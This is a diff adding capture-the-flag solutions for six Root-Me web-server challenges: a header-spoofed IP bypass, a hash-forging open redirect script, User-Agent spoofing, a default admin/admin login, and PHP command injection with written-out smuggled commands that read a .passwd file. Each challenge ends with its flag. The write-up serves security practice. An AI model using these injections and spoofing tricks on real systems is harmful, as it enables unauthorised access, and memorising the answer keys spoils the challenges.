@@ -6,12 +6,12 @@ These challenges are designed to train users on HTML, HTTP and other server side
 
 ## Contents
 
-1. [HTML - Source code](#html-source-code)
-2. [HTTP - IP restriction bypass](#http-ip-restriction-bypass)
-3. [HTTP - Open redirect](#http-open-redirect)
-4. [HTTP - User-agent](#http-user-agent)
-5. [Weak password](#weak-password)
-6. [PHP - Command injection](#php-command-injection)
+1. [HTML - Source code](#html-source-code) 🗸
+2. [HTTP - IP restriction bypass](#http-ip-restriction-bypass) 🗸
+3. [HTTP - Open redirect](#http-open-redirect) 🗸
+4. [HTTP - User-agent](#http-user-agent) 🗸
+5. [Weak password](#weak-password) 🗸
+6. [PHP - Command injection](#php-command-injection) 🗸
 7. [Backup file](#backup-file)
 8. [HTTP - Directory indexing](#http-directory-indexing)
 9. [HTTP - Headers](#http-headers)
@@ -88,26 +88,24 @@ These challenges are designed to train users on HTML, HTTP and other server side
 
 ---
 
-## ChallengeName
+## HTML Source Code
 
-- Author: name
-- X Points
+- Author: g0uZ
+- Date: 3 October 2006
+- Points: 5
+- Level: 1
 
-### Description
+### Statement
 
-Description Here
+None.
 
-### Hints
+### Links
 
-1. Hint 1
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch1/).
 
-### Connection Details
+### Resources
 
-1. Detail 1
-
-### Attachments
-
-1. Attachment 1
+1. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).
 
 ### Solutions
 
@@ -115,7 +113,40 @@ Description Here
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <!--
+Bienvenue sur ce portail,
+Welcome on this portal,
+J'espère que vous passerez un agréable moment parmi nous, mais surtout que vous repartirez plein de choses dans la tête...
+I hope that you will enjoy your time among us, and above that all you will leave with lots of things in the head ...
+@ très bientôt
+See ya
+-->
+    <h1>Login v0.00001
+    </h1>
+    <form>
+      Password&nbsp;
+      <input type="password" value="" name="password"/>
+      <br/>
+      <input type="submit" value="login" />
+    </form>
+    <!--
+Je crois que c'est vraiment trop simple là !
+It's really too easy !
+password : nZ^&@q5&sjJHev0
+-->
+  </body>
+</html>
+~~~
+
+We can see the password is included in the html.
 
 </details>
 
@@ -126,7 +157,527 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
+nZ^&@q5&sjJHev0
+~~~
 
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP IP restriction bypass
+
+- Author: Cyrhades
+- Date: 23 March 2021
+- Points: 10
+- Level: 1
+
+### Statement
+
+Dear colleagues,
+
+We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.
+
+Regards,
+
+The network admin
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch68/).
+
+### Resources
+
+1. [RFC 1918](https://repository.root-me.org/RFC/EN%20-%20rfc1918.txt).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):
+
+~~~html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Secured Intranet
+    </title>
+  </head>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <span>Your IP 
+      <strong>::ffff:86.13.104.48
+      </strong> do not belong to the LAN.
+    </span>
+    <h1>Intranet
+    </h1>
+    <form method="post">
+      <p>
+        <label for="login">Login:
+        </label>
+        <input type="text" name="login">
+      </p>
+      <p>
+        <label for="pass">Password:
+        </label>
+        <input type="text" name="mdp">
+      </p>
+      <p>
+        <input type="submit" value="login">
+      </p>
+      <p>
+        <small>You should authenticate because you're not on the LAN.
+        </small>
+      </p>
+    </form>
+  </body>
+</html>
+~~~
+
+Assuming the LAN is a private IP address, we can send a curl request with a cutom IP 192.168.0.2:
+
+~~~shell
+$ curl --header "X-Forwarded-For: 192.168.0.1" http://challenge01.root-me.org/web-serveur/ch68/
+~~~
+
+We get a html response with the solution:
+
+~~~html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Secured Intranet
+    </title>
+  </head>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <h1>Intranet
+    </h1>
+    <div>
+      Well done, the validation password is: 
+      <strong>Ip_$po0Fing
+      </strong>
+    </div>
+  </body>
+</html>
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+Ip_$po0Fing
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP Open redirect
+
+- Author: Swissky
+- Date: 2 August 2017
+- Points: 10
+- Level: 1
+
+### Statement
+
+Find a way to make a redirection to a domain other than those showed on the web page.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch52/).
+
+### Resources
+
+1. [Understanding and Discovering Open Redirect Vulnerabilities](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Understanding%20and%20Discovering%20Open%20Redirect%20Vulnerabilities%20-%20Trustwave.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):
+
+~~~html
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>HTTP - Open redirect
+    </title>
+  </head>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <h1>Social Networks
+    </h1>
+    <a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook
+    </a>
+    <a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter
+    </a>
+    <a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack
+    </a>
+    <style type="text/css">
+      body{
+        text-align: center;
+        font-family: arial;
+      }
+      a{
+        color: #FFFFFF;
+        text-decoration: none;
+        text-transform: capitalize;
+        padding: 8px;
+        background-color: #1CB2D2;
+        border-radius: 5px;
+        width: 100px;
+        display: inline-block;
+      }
+      a:hover{
+        background-color: #3968A9;
+      }
+      #error{
+        color: red;
+        font-weight: bold;
+      }
+    </style>
+  </body>
+</html>
+~~~
+
+We can see 3 links to facebook, twitter and slack.  These links are redirects that include the string md5 hash.  We can test it with a new redirect:
+
+~~~
+?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
+~~~
+
+When navigating, we can see the site briefly redirects to the flag before redirecting to the directed website.  We can write a short Python script to capture the flag:
+
+~~~py
+import hashlib
+import requests
+
+URL = "http://challenge01.root-me.org/web-serveur/ch52/"
+a = "https://google.com"
+b = hashlib.md5(a.encode())
+
+redirect = "?url="+a+"&h="+b.hexdigest()
+print(redirect)
+
+r = requests.Session()
+website = r.get(URL+redirect)
+print(website.text)
+~~~
+
+We get the intermediary redirect as the response:
+
+~~~html
+<!DOCTYPE html>
+<html>
+<head>
+        <title>HTTP - Open redirect</title>
+</head>
+
+
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
+</p><script>document.location = 'https://google.com';</script>
+<style type="text/css">
+        body{
+                text-align: center;
+                font-family: arial;
+        }
+
+        a{
+                color: #FFFFFF;
+                text-decoration: none;
+                text-transform: capitalize;
+                padding: 8px;
+                background-color: #1CB2D2;
+                border-radius: 5px;
+                width: 100px;
+                display: inline-block;
+        }
+        a:hover{
+                background-color: #3968A9;
+        }
+
+        #error{
+                color: red;
+                font-weight: bold;
+        }
+
+</style>
+</body>
+</html>
+~~~
+
+This gives us the challenge solution
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+e6f8a530811d5a479812d7b82fc1a5c5
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## HTTP User agent
+
+- Author: g0uZ
+- Date: 3 October 2006
+- Points: 10
+- Level: 1
+
+### Statement
+
+None.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch2/).
+
+### Resources
+
+1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
+2. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <h3>Wrong user-agent: you are not the "admin" browser!
+    </h3>
+  </body>
+</html>
+~~~
+
+We have the wrong user agent.  We can use curl to visit the site with a custom user agent:
+
+~~~shell
+$ curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
+~~~
+
+We get the html response:
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <h3>Welcome master!
+      <br/>Password: rr$Li9%L34qd1AAe27
+    </h3>
+  </body>
+</html>
+~~~
+
+This gives us the challenge solution
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+rr$Li9%L34qd1AAe27
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## Weak password
+
+- Author: g0uZ
+- Date: 3 October 2006
+- Points: 10
+- Level: 1
+
+### Statement
+
+None.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch3/).
+
+### Resources
+
+1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
+2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
+3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Navigating to the challenge site, we try "admin/admin" and are logged in!
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+admin
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## PHP Command Injection
+
+- Author: sambecks
+- Date: 20 September 2017
+- Points: 10
+- Level: 1
+
+### Statement
+
+Find a vulnerabilty in this service and exploit it.
+
+The flag is on the index.php file.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch54/).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Navigating to the challenge site, we find the html site:
+
+~~~html
+<html>
+  <head>
+    <title>Ping Service
+    </title>
+  </head>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <form method="POST" action="index.php">
+      <input type="text" name="ip" placeholder="127.0.0.1">
+      <input type="submit">
+    </form>
+    <pre>
+</pre>
+  </body>
+</html>
+~~~
+
+We can see the ip address is passed to a "ping" command, and the website prints the shell output.  We can inject shell commands into the form:
+
+~~~
+8.8.8.8; ls -l
+~~~
+
+The webpage returns:
+
+~~~
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=1.99 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=1.95 ms
+64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=1.85 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+rtt min/avg/max/mdev = 1.851/1.931/1.992/0.059 ms
+total 4
+-rw-r----- 1 web-serveur-ch54 www-data 438 Dec 10 21:20 index.php
+~~~
+
+We can see the index.php file there. trying cat returns a second form.  We can now view the php code:
+
+~~~php
+$flag = "".file_get_contents(".passwd")."";
+if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+        echo $response;
+~~~
+
+We can see the flag is stored in a hidden file .passwd.  We can view this with inject:
+
+~~~
+8.8.8.8; cat .passwd
+~~~
+
+This gives us the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+S3rv1ceP1n9Sup3rS3cure
 ~~~
 
 </details>
